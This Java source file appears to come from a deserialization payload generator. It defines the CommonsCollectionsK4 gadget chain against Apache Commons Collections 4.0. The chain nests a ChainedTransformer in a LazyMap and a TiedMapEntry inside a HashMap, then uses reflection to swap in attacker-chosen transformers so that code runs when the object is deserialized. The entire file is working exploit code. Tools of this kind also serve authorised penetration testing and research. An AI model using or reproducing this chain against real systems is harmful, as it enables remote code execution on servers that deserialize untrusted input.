package com.ppp.chain.collections4;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 */
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({Authors.KORLR})
@Sink({Sink.InvokerTransformer4})
public class CommonsCollectionsK4 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK4.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object transformers) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        HashMap<String, String> innerMap = new HashMap<String, String>();
        LazyMap lazyMap = LazyMap.lazyMap(innerMap, transformerChain);

        Map<Object, Object> hashMap = new HashMap<Object, Object>();
        TiedMapEntry tied = new TiedMapEntry(lazyMap, "x");
        hashMap.put(tied, "t");
        innerMap.clear();

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return hashMap;
    }
}
